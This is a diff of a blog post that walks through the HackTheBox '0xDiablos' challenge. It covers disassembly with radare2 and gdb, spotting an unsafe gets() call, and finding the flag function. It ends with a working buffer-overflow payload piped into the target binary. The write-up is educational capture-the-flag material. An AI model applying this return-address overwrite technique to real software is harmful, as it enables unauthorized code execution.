@@ -1,13 +1,21 @@
+---
+title: "0xdiablos"
+date: 2022-09-20T15:33:31+01:00
+draft: false
+categories:
+  - HackTheBox
+---
 # You know who are 0xDiablos
 
-First challenge
-No nmap scan or gobuster...I just had to download the vuln script in zip archive with a given password (see password.txt)
+First challenge on this platform!
 
-After unzipping and executing the program just takes an input and echo it back in the console...
+No nmap scan or gobuster...I just had to download the [vuln](vuln) script in zip archive with a given password (hackthebox)
+
+After unzipping and executing it, the program just takes an input and echo it back in the console...
 
 Seems like its about reverse engineering and buffer overflow
 
-I dont know reverse engineering tools alot so googling gave us radare2 and iaito
+I dont know reverse engineering tools alot so googling gave us `radare2`
 
 Installed radare2
 
@@ -46,21 +54,8 @@ GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
 Copyright (C) 2021 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
 This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.
-Type "show copying" and "show warranty" for details.
-This GDB was configured as "x86_64-linux-gnu".
-Type "show configuration" for configuration details.
-For bug reporting instructions, please see:
-<https://www.gnu.org/software/gdb/bugs/>.
-Find the GDB manual and other documentation resources online at:
-<http://www.gnu.org/software/gdb/documentation/>.
 
-For help, type "help".
-Type "apropos word" to search for commands related to "word"...
-Reading symbols from vuln...
-(No debugging symbols found in vuln)
-(gdb) info function
-All defined functions:
+...
 
 Non-debugging symbols:
 0x08049000 \_init
@@ -133,13 +128,11 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-Main function seems not to be vulnerable but calls vuln...we diasassemble vuln too and get a gets() usage wich can be vulnerable to BOF
+Main function seems not to be vulnerable but calls vuln function...we disassemble vuln too and notice a gets() usage which can be vulnerable to BOF
 
-There is a nice tool called PEDA (gdb-peda) that facilitate RE
+There is a nice tool called `PEDA (gdb-peda)` that facilitate RE
 
-Or use Cutter for code analysis alternatively to
-
-`cutter vuln`
+Or use `Cutter` for code analysis alternatively to r2
 
 Now back to radare2
 
@@ -177,7 +170,7 @@ afl //to analyze functions
 0x08049000 3 32 sym.\_init
 ```
 
-we see the script has 3 functions vuln, main and flag...main calls vuln wich uses gets
+we see the script has 3 functions vuln, main and flag...main calls vuln which uses gets
 
 we can overflow that function
 
@@ -241,7 +234,7 @@ we can overflow that function
 //We are at address value from vuln that is 0x08049272
 ```
 
-now for flag function
+Now for flag function
 
 ```
 0x08049272]> s sym.flag
@@ -305,7 +298,7 @@ now for flag function
 └ 0x08049271 c3 ret
 ```
 
-Address for flag function is 0x080491e2...lets convert it to hex format with p32 from python pwntools
+Address for flag function is 0x080491e2...lets convert it to hex format with p32 from python `pwntools`
 
 ```
 from pwn import \*
@@ -338,7 +331,7 @@ Now the final paylaod is:
 
 `python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | ./vuln`
 
-used an exploit.py script for better comfort and usabilty
+used an [exploit.py](exploit.py) script for better comfort and usabilty
 
 You can also use netcat directly
 
@@ -349,4 +342,4 @@ You know who are 0xDiablos:
 HTB{Ìnsert_flag_here}
 ```
 
-How was that an easy challenge? imagine the difficulty of buffer overflow in general now...Go learn assembly
+How was that an easy challenge? Imagine the overall difficulty now...Go learn some assembly asap!!!
